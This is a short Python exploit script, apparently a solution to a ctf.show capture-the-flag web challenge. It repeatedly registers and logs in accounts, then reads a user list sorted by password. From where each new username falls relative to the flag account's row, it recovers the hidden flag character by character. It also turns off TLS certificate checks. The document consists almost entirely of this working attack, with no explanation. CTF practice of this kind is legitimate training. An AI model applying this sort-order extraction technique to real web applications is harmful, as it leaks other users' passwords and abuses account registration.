import requests

requests.packages.urllib3.disable_warnings()

url="https://38efdd1f-cdef-443c-8874-b37f6894c272.challenge.ctf.show"
url1=url+"/reg.php" #注册页面
url2=url+"/login.php"#登录界面
url3=url+"/user_main.php?order=pwd" #查询界面

k=""
s="-.0123456789:abcdefghijklmnopqstuvwxyzr{|}~"
for j in range(0,45):
    print("*")
    for i in s:
        # print(i)
        l=""
        l=k+i
        l2 = k+chr(ord(i)-1)
        data={'username':l,
                    'email':'c',
                    'nickname':'c',
                    'password':l
        }
        data2={'username':l,
                      'password':l
        }
        if (l=='flag'):
            k='flag'
            print(k)
            break
        session = requests.session()
        r1 = session.post(url1,data, verify=False)
        r2 = session.post(url2,data2, verify=False)
        r3 = session.get(url3, verify=False)
        t = r3.text
        #print(l)
        if (t.index("<td>"+l+"</td>")>t.index("<td>flag@ctf.show</td>")):
            k=l2
            print(k)
            break